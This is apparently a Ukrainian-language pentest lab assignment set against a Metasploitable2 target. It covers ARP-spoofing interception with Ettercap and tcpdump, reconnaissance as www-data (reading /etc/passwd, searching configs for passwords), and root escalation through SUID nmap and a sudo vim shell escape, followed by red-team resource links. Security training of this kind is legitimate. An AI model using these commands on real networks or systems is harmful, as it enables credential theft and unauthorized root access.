# 🛡️ Lab 5: Мережа + підвищення

## 1. 🕵️‍♂️ MITM атака з Ettercap (ARP Spoofing)

### 🔹 Опис завдання:

Провести ARP Spoofing-атаку за допомогою `Ettercap`, перехопити трафік між атакованою машиною та шлюзом.

### 🔹 Кроки виконання:

1. Запусти `Ettercap` у графічному режимі або CLI:
   ```bash
   ettercap -T -M arp:remote /victim_ip/ /gateway_ip/
   ```
2. Визнач жертву (Metasploitable2) та шлюз (наприклад, роутер або Kali).
3. Запусти атаку, проаналізуй отримані пакети tcpdump -i eth0 host 192.168.0.0 -w dump.pcap - може вдастся перехопити облікові записи під час авторизації у локальний або публічний ресурс.

### 🔹 Що надати:

- Скріншоти конфігурації Ettercap
- Перехоплений логін/пароль (якщо вийде)
- Проблеми (наприклад: дублікати IP, захист OS)

---

## 2. 🧙‍♂️ Прихована розвідка з правами www-data

### 🔹 Опис завдання:

Після компрометації вебсервера (наприклад, через LFI або RCE), дослідити систему з правами `www-data`.

### 🔹 Цілі:

- Знайти користувачів
- Перевірити доступні конфіги
- Зібрати інформацію про процеси та мережу
- Передивитись історію і можливі запущені процеси та права на них

### 🔹 Команди:

```bash
whoami
id
cat /etc/passwd
ps aux
netstat -tulpan
find / -type f -name '*.conf' 2>/dev/null
```

### 🔹 Що надати:

- Скріншоти команд і виводу
- Виявлені цікаві конфіги або хардкод-паролі

---

## 3. 🔓 Підвищення привілеїв через SUID

### 🔹 Опис завдання:

Знайти бінарники з правами SUID і використати їх для отримання доступу до root.

### 🔹 Пошук:

```bash
find / -perm -4000 -type f 2>/dev/null
```

### 🔹 Популярні вектори:

- `/bin/bash`
- `/usr/bin/nmap`
- `/usr/bin/find`
- `/usr/bin/python`

### 🔹 Приклад експлуатації:

```bash
# для nmap
nmap --interactive
!sh
```

### 🔹 Що надати:

- Список знайдених SUID
- Метод експлуатації
- Доказ root-доступу (`whoami`)

---

## 4. 🧨 Підвищення прав через sudoers

### 🔹 Опис завдання:

Перевірити доступні sudo-команди для поточного користувача.

### 🔹 Команди:

```bash
sudo -l
```

### 🔹 Якщо доступно щось типу:

```bash
(root) NOPASSWD: /usr/bin/vim
```

### 🔹 Використати:

```bash
sudo vim -c '!sh'
```

### 🔹 Що надати:

- Результат `sudo -l`
- Команди експлуатації
- `id`/`whoami` як root

---

## 📋 Ресурси для Red Team та Pentest перевірок

### 🔹 Чеклісти та гіди:

- [Vulnerability dictionary](https://www.cobalt.io/vulnerability-wiki/v5-validation-sanitization)
- [Awesome-Hacking](https://github.com/Hack-with-Github/Awesome-Hacking)
- [Certified Red Team Professional (CRTP)](https://dev-angelist.gitbook.io/crtp-notes)
- [HackTricks](https://book.hacktricks.wiki/en/welcome/about-the-author.html)
- [Pentest Book](https://pentestbook.six2dez.com/enumeration/ports)
- [Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/)
- [Application Security Cheat Sheet](https://0xn3va.gitbook.io/cheat-sheets/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/index.html)
- [PENTESTING-BIBLE](https://github.com/oxfemale/PENTESTING-BIBLE)
- [Kubernetes Goat](https://madhuakula.com/kubernetes-goat/docs/)
- [CSbyGB's Pentips](https://csbygb.gitbook.io/pentips)
- [Pentration Testing, Beginners To Expert!](https://github.com/xalgord/Massive-Web-Application-Penetration-Testing-Bug-Bounty-Notes)
- [Offensive Security Cheatsheet](https://cheatsheet.haax.fr/)
- [HighOn.Coffee](https://highon.coffee/blog/)
- [Red Team Guides](https://redteam.guide/docs/guides/)
- [Cyber-Bookmarks](https://x0rb3l.github.io/Cyber-Bookmarks/bookmarks.html)
- [IT-Security](https://sushant747.gitbooks.io/total-oscp-guide/content/)

---

✅ **Результати надати у вигляді скріншотів із короткими поясненнями:**

- Що виконано
- Які проблеми виникли (якщо були)
- Який результат досягнуто

